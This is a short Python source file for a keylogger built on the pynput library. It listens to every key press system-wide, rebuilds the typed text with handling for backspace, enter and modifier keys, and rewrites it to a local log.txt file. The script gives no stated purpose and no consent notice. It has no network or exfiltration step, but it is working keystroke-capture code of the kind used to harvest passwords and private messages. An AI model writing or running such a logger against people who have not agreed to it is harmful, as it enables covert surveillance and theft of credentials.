from pynput.keyboard import Listener


# Internal buffer to store keystrokes
log = []

#Function to replace the keycodes
def write_to_file(key):
    letter = str(key)
    letter=letter.replace("'","")
    letter=letter.replace("Key.space"," ")

#right Shift    
    if letter == 'Key.shift_r':
       letter = ''     

#Left Shift        
    if letter == 'Key.shift':
        letter = ''
        
#Enter        
    if letter == 'Key.enter':
        letter = '\n'    


#Backspace
    elif letter == "Key.backspace":
        if log:  # Ensure log is not empty before removing
            log.pop()
        letter = None  # Do not log backspace itself

    # Ignore Shift keys
    elif "shift" in letter.lower():
        letter = None
    
    elif "ctrl" in letter.lower():
        letter = None

    # Append valid characters
    if letter is not None:
        log.append(letter)

    # Write updated buffer to file
    with open("log.txt", "w") as f:
        f.write("".join(log)) # Convert list to string and write


#Calls write_to_file() when a key is pressed and Keeps the program running until manually stopped        
with Listener(on_press=write_to_file) as l:
  l.join()
  